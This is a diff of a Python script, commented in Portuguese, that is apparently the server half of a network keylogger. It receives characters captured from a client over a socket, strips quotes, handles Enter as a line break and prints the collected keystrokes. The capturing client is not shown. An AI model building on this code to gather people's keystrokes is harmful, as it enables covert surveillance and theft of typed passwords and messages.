@@ -39,35 +39,36 @@ print("Conexão de: " + str(cliente))
 
 
 global key_words
-# criação da variável global key_words, para ser usada em todo o projeto
+# variável global key_words, para ser usada em todo o projeto
+
+key_words = ''
+    # cria uma lista para receber os carcteres
 
 while True:
-    key_words = ''
-    # É iniciada a lista de recebimento dos caractéres
+    # condição usada para deixar o servidor online
 
     keydata = con.recv(1024)
     # Aguarda um dado enviado pela rede de até 1024 Bytes, a função ‘recv’ possui somente
     # 1 argumento que é o tamanho do Buffer
 
     key = keydata.decode('utf-8')
-    # convertendo de byte para string o caráctere enviado pelo cliente
+    # convertendo de byte para string, os dados das mensagens são convertidos em binário durante a trasnmição clinete
+    # servidor
 
-    if str(key) == "Key.space":
-
-        key = ''
-    # inplementando a função de espaço
-
-    elif str(key) != "Key.enter":
+    if str(key) != "Key.enter":
         key_words = key_words + key
-        retira_aspas = "'"
+        remocao_aspas = "'"
 
-        for aspas in retira_aspas:
+        for aspas in remocao_aspas:
             key_words = key_words.replace(aspas, '')
-    # implementando a retirada de aspas das letras recebidas
+    # função usada para remover as aspas colocadas pela biblioteca keyboard ao reconhecer os caracteres digitados
 
     elif str(key) == "Key.enter":
         key = '\n'
-    # inplementando a função do enter
+        key_words = key_words + key
+    # condição utilizada para quebra de linha
 
-    key_words = key_words + key
     print(key_words)
+    # print das palavras recebidas
+
+
